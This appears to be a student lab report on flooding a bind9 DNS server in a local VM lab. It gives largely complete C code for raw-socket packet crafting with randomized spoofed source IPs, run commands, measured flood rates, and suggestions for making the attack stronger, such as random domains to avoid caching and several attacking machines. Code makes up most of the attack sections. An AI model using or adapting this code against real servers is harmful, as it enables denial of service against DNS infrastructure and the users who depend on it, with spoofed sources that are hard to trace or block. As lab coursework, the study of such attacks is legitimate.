# DoS Attack to the DNS Server Using Spoofed IP Address



## 1. Setting Up the DNS Server and the Client

We used bind9 to use one VM as a DNS server. We run the command `service bind9 status` to check if the DNS server is working properly. The output is as follows:

<img src="https://raw.githubusercontent.com/MahirSez/DoS-Attack-on-DNS-Server-with-Spoofed-IP/main/report/final-report/bind9-status.png" style="zoom: 80%;" />

We set up another VM as our client. In order to make sure that all of our client's DNS requests go through `dns-server@192.168.0.105` we update the `/etc/resolv.conf` file in the client VM and change the address to `192.168.0.105`. Now, to check if the client is actually using `dns-server@192.168.0.105` as its DNS server we run `nslookup google.com` on the client machine and check the output:

<img src="https://raw.githubusercontent.com/MahirSez/DoS-Attack-on-DNS-Server-with-Spoofed-IP/main/report/final-report/client-nslookup.png" style="zoom: 80%;" />



## 2. Using Socket to Send DNS Requests from the Attacker

Now, our primary target is to send an enormous amount of DNS request to `dns-server@192.168.0.105` from the attacker programmatically. We also need to spoof our IP address to hide our identity. We use raw socket to accomplish this. Raw sockets are very powerful in the sense that it gives the power to specify network level details such as source IP, destination IP etc.

### 2.1. Why Raw Socket?

It appears that we could use Datagram Sockets to easily create UDP packets and add the application layer DNS payload for out attack. But, the source IP resides in the network layer which is set by the kernel before sending out of the machine. Doing so, fails our purpose of spoofing the IP. Thus, we are forced to use raw sockets here. 

### 2.2. Creating The Socket Descriptor

Using raw sockets gives us the responsibility to write the network, transport and application layer headers manually. First, we get the socket 's f descriptor by calling:

```C
int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
```

Here, 

-   `PF_INET` is the IP protocol family.  
-   `SOCK_RAW` specifies that we are using raw socket.
-   By mentioning `IPPROTO_UDP` we specify that we are using UDP protocol.

    

Next, we tell the kernel that the IP header would be included in the payload by calling: 

```c
int yes = 1,
setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &yes, sizeof(yes))
```

Here, 

-   `sd` is the socket descriptor returned from the function `socket()`.
-   `IPPROTO_IP` defines that the option is about the IP level protocol.
-   `IP_HDRINCL` defines that the option is about IP header inclusion in the payload.



### 2.3. Constructing the Payload

The basic structure of our payload would be as follows: 

<img src="https://raw.githubusercontent.com/MahirSez/DoS-Attack-on-DNS-Server-with-Spoofed-IP/1dbe51bb5d540a49ff155fdf81810ea26c16d3ab/report/final-report/Payload%20Buffer-bg-white.svg"/>

We first take a buffer of size 1024 bytes and allocate space for the IP header, UDP header and the DNS header:

```c
const int BUFFER_LEN = 1024;

char buffer[BUFFER_LEN];
size_t pos = 0;

memset(buffer, 0, sizeof(buffer));

struct iphdr *ip = (struct iphdr *) (buffer + pos);
pos += sizeof(struct iphdr);

struct udphdr *udp = (struct udphdr *) (buffer + pos) ;
pos += sizeof(struct udphdr);

struct dns_header *dns_h = (struct dns_header *) (buffer + pos);
pos += sizeof(struct dns_header);

```

As the DNS question would have variable length depending on the queried domain name, we cannot allocate space for that before setting the question.



### 2.4. Filling the IP Header

We now populate the IP header of our packet. The format of the IP header is as follows: 

<img src="https://raw.githubusercontent.com/MahirSez/DoS-Attack-on-DNS-Server-with-Spoofed-IP/b6445780f41b92615f0c00a642e4ae972626c6b8/report/final-report/ip-header.svg" style="zoom: 80%;" />

Fortunately, we did not need to define our own structure for the IP header. Instead, we used the IP header provided with the ` linux/ip.h` library:

```c
void fill_ip(struct iphdr *ip) {
    ip->ihl      = 5;  // Header size = 5 * 32 bit
    ip->version  = 4;  // IPv4
    ip->tos      = 16; // low delay
    ip->id       = htons(rand() & 0xFFFF); // randomly assignning ip-id
    ip->ttl      = 64; // hops
    ip->protocol = 17; // UDP
    ip->saddr = inet_addr("1.2.3.4");   //spoofing ip
    ip->daddr = inet_addr(DNS_SERVER);  // DNS ip
}
```

Notice that, we did not set the **Total Length** and **Header Checksum** field in the IP header. These two fields are set by the kernel when the `IP_HDRINCL` option is set.



### 2.5. Filling the UDP Header

The structure of the UDP header is as follows: 

<img src="https://raw.githubusercontent.com/MahirSez/DoS-Attack-on-DNS-Server-with-Spoofed-IP/b6445780f41b92615f0c00a642e4ae972626c6b8/report/final-report/UDP%20header.svg" style="zoom: 67%;" />

We used the UDP header structure provided with the `linux/udp.h` library to fill the UDP header:

```c
void fill_udp(struct udphdr *udp, size_t len) {
    udp->source = htons(10);        // source port
    udp->dest = htons(DNS_PORT);    // DNS port
    udp->len = htons(len);          // length of UDP header + DNS header + DNS question
}
```

Notice that, the `len` field requires the length of the **UDP header**, **DNS header** and **DNS question**. As the DNS question can be of variable length, we fill the UDP header after filling the DNS header and the DNS question.



### 2.6. Filling the DNS Header

The structure of the DNS header is as follows: 

<img src="https://raw.githubusercontent.com/MahirSez/DoS-Attack-on-DNS-Server-with-Spoofed-IP/b6445780f41b92615f0c00a642e4ae972626c6b8/report/final-report/DNS%20header.svg" style="zoom: 70%;" />

Unlike IP and UDP, we had to write our own structure for the DNS header:

```c
struct dns_header {
  uint16_t xid;
  uint16_t flags;
  uint16_t qdcount;
  uint16_t ancount;
  uint16_t nscount;
  uint16_t arcount;
};
```

Next, we fill the DNS header as follows: 

```c
void fill_dns_header(struct dns_header *dns_h) {
    dns_h->xid= htons(rand()& 0xFFFF);  // randomly assigning dns-id
    dns_h->flags = htons(0x0100);  // recursion desired
    dns_h->qdcount = htons (1);    // 1 question
    dns_h->ancount = 0;
    dns_h->nscount = 0;
    dns_h->arcount = 0;
};
```



### 2.7. Filling the DNS Question

The structure of the DNS question is as follows: 

<img src="https://raw.githubusercontent.com/MahirSez/DoS-Attack-on-DNS-Server-with-Spoofed-IP/b6445780f41b92615f0c00a642e4ae972626c6b8/report/final-report/DNS%20question.svg" style="zoom:67%;" />

We define our DNS question structure as follows:

```c
struct dns_question {
    char *name;
    uint16_t dnstype;
    uint16_t dnsclass;
};
```

#### 2.7.1. Building Domain Name

The `QName` requires the following structure:

```
A domain name is represented as a sequence of labels, where each label consists of a length octet followed by that number of octets. The domain name terminates with the zero length octet for the null label of the root.
```

For example, the domain **www.abcd.com** would become  **3www4abcd3com0**.

Our `build_domain_name()` function is as follows: 

```c
char *build_domain_qname (char *hostname) {
	char *name = calloc(strlen (hostname) + 1, sizeof (char));  // 1 extra for the inital octet

	/* Leave the first byte blank for the first field length */
	memcpy(name + 1, hostname, strlen (hostname));
	int hostname_len = strlen(hostname);

	char count = 0;
	char *prev = name;

	for (int i = 0; i < hostname_len ; i++) {
		if (hostname[i] == '.') {
			*prev = count;
			prev = name + i + 1;
			count = 0;
		}
		else count++;
	}
	*prev = count;
	return name;
}
```

#### 2.7.2. Filling the DNS Question Structure

Next, we fill the `dns_question` structure as follows: 

```c
size_t fill_dns_question(char* buffer) {

    int len = 0;
    struct dns_question question;
    question.name = build_domain_qname(DOMAIN_NAME);
	question.dnstype = htons(1);   // QTYPE A records
	question.dnsclass = htons(1);  // QCLASS Internet Address

    memcpy(buffer, question.name, strlen(question.name) + 1);
    buffer += strlen(question.name) + 1 ;
    memcpy(buffer, &question.dnstype, sizeof (question.dnstype));
    buffer += sizeof(question.dnstype);
    memcpy (buffer, &question.dnsclass, sizeof (question.dnsclass));

	int ret_len = strlen(question.name) +  1 + sizeof(question.dnstype) + sizeof (question.dnsclass);
	free(question.name);
    return ret_len;
}
```



### 2.8. Using `sendto()` to Send the Payload:

Finally, we send our packets using the `sendto()` function:

```c
sendto(sd, buffer, pos, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0 )
```

Here `sin` is the `sockaddr_in` in which we specify the `sin_family`, destination IP and the destination port:

```c
void fill_sin(struct sockaddr_in *sin) {
    sin->sin_family = AF_INET;  // IP Address Family
    sin->sin_port = htons(DNS_PORT);
    sin->sin_addr.s_addr = inet_addr(DNS_SERVER);
}
```



## 3. Spoofing Source IP

As the attacker, we want to spoof our IP address every time we send the DNS server any request. Otherwise, the server may identify the source IP from the repeating requests and stop processing / block further requests from it. To spoof our IP, we will 

-   Change the source IP address in our payload with a random IP 
-   Change the ID field in the IP header with a random ID
-   Change the ID field in the DNS header with a random ID

Our `spoof_identity()` function accomplishes this:

```c
void spoof_identity(struct iphdr *ip, struct dns_header *dns_h) {
	char ip_addr[20] ;
	sprintf(ip_addr, "%d.%d.%d.%d", rand() & 0xFF, rand() & 0xFF, rand() & 0xFF, rand() & 0xFF ) ;
	ip -> saddr = inet_addr(ip_addr);
	ip->id = htons(rand() & 0xFFFF);
	dns_h->xid= htons(rand()& 0xFFFF); 
}
```



## 4. Testing the Attack

Before initializing our attack, we performed the following checks to see everything was working smoothly:

### 4.1. Sending Sample DNS Request Through Socket:

First we tested our socket connection. We sent a regular DNS request with our original IP address. The output of Wireshark in the `dns-server@192.168.0.105` is as follows:

![](https://raw.githubusercontent.com/MahirSez/DoS-Attack-on-DNS-Server-with-Spoofed-IP/main/report/final-report/without-spoof.png)

So, we came to the conclusion that our socket connection was successfully working.

### 4.2. Sending Sample DNS request with Spoofed IP:

Next, we did the same check but with spoofed IP.  The output of Wireshark in the `dns-server@192.168.0.105` is as follows:

![](https://raw.githubusercontent.com/MahirSez/DoS-Attack-on-DNS-Server-with-Spoofed-IP/main/report/final-report/spoofed-ip.png)

So, we can conclude that our IP spoofing has also been successful.

### 4.3. Performing DoS with Spoofed IP

Finally, we combine everything above and perform our final DoS attack on the DNS server. We send the DNS requests in a loop and each time before sending the request we spoof our IP. We put our attacking code in `attack.c` file in our host machine and run the command: 

```bash
$ gcc attack.c -o attack
$ sudo ./attack
```

Through Wireshark we now observe a flood of of requests accumulated at the DNS server:

![](https://raw.githubusercontent.com/MahirSez/DoS-Attack-on-DNS-Server-with-Spoofed-IP/main/report/final-report/wireshark-attack-snapshot.png)

One thing to notice here is that because of IP spoofing all of the source IP-s are different and it is now impossible to detect the attacker's source IP and block it. 

Now, if we perform an `nslookup ` from the client machine during the attack we get **connection timed out** indicating that the client is not getting the DNS service:

![](https://raw.githubusercontent.com/MahirSez/DoS-Attack-on-DNS-Server-with-Spoofed-IP/main/report/final-report/client-connection-timed-out.png)

Even if we check from the browser of our client, we observe the same situation. The web-page does not load until we halt our attack.

Thus, we come to the conclusion that our attack to the DNS server was successful.



## 5. Attack Statistics

1.  On our attack, we managed to generate and send approximate $1.5 \cdot 10^5$  DNS requests per second to the server. This was actually enough to flood the server and block subsequent requests from other clients.
2.  We tried to lower the request frequency to $2 \cdot 10^4$ pkt/s, $7\cdot10^4$ pkt/s  to check whether our attack still works. Unfortunately, even at a request generation of $7\cdot10^4$ pkt/s the DNS server could serve the client's DNS request. 
3.  One possible variation of our attack might be to request different domain names every time so that the server can not cache the result. This requires ether generating a domain name every time we send a request or saving a large number of domain name in our local storage / database.
4.  If we decide to generate low frequency of requests from a single machine then another possible solution might be to use multiple VMs and perform the attack simultaneously on a single DNS server. By doing so, we can achieve a DNS request frequency of around $1\cdot10^6$ pkt/s.
